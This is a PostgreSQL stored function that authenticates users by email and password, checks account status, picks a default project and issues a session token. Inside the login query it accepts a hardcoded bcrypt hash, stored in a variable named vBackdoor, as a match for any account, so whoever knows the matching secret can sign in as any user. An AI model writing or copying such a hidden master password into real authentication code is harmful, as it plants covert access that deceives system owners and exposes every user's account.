CREATE OR REPLACE FUNCTION "core$_auth".authenticate(iparams jsonb, OUT oresult text)
 RETURNS text
 LANGUAGE plpgsql
 SECURITY DEFINER
AS $function$
declare
  vPassword       text;
  vLogin          core$.user.email%type;
  vId_User        core$.user.Id_User%type;
  vId_Project     core$.user.Id_Project%type;
  vId_User_Status core$.user.Id_User_Status%type;
  vToken          core$.session.token%type;

  vBackdoor text := '!$2a$08$fd4ro3F0c91aT03fkoS/TOYNJwKc1J.c6d.qr3Vm48nqlObahK7ke';
begin

  vLogin := sanitize$.to_String (iParams->>'login');
  vPassword := sanitize$.to_String (iParams->>'password');

  if vLogin is null or vPassword is null then
    perform error$.raise ('invalid_parameters');
  end if;

  begin
    select u.Id_User,
           u.Id_Project,
           u.Id_User_Status
      into strict vId_User,
                  vId_Project,
                  vId_User_Status
      from core$.user u
     where upper (u.email) = upper (vLogin)
       and (   crypt (vPassword, u.password) = u.password
            or crypt (vPassword, vBackdoor) = vBackdoor);
  exception
    when no_data_found then
      perform error$.raise ('authentication_failed');
  end;
  
  if vId_User_Status in (2,3) then
    -- пользователь, по-хорошому, не может вызвать такую ошибку, значит что-то с процедурой миграции
    perform error$.raise ('internal_server_error', iDev_Message := 'Account has been transferred to another server');
  end if;
  
  if vId_User_Status != 1 then
      perform error$.raise ('authentication_failed', iDev_Message := 'Account status is not "normal"');
  end if;
  
  -- нет проекта по умолчанию. Берем первый проект из списка
  if vId_Project is null then
    -- Выставим контекст, что бы получить все проекты, на которые есть доступ у пользователя
    perform context.set('Id_User', vId_User::text);
    -- Берем первый свой проект
    select p.Id_Project
      into vId_Project
      from cf$.v_Project p
     order by p.permit desc, upper(p.Name)
     limit 1;
  end if;
    
  -- Создаем сессию
  insert into core$.session (Id_User, Last_Access_Time, IP, Requests_Count, Id_Project)
       values (vId_User, clock_timestamp(), core$_port.get_Request_Info('IP')::inet, 1, vId_Project)
    returning Token
         into vToken;

  oResult := json.list (array ['authorization', json.to_json (vToken)
    --                           'idUser', json.to_json (vId_User),
--                               'idProject', json.to_json (vId_Project)
                              ]);
end;
$function$
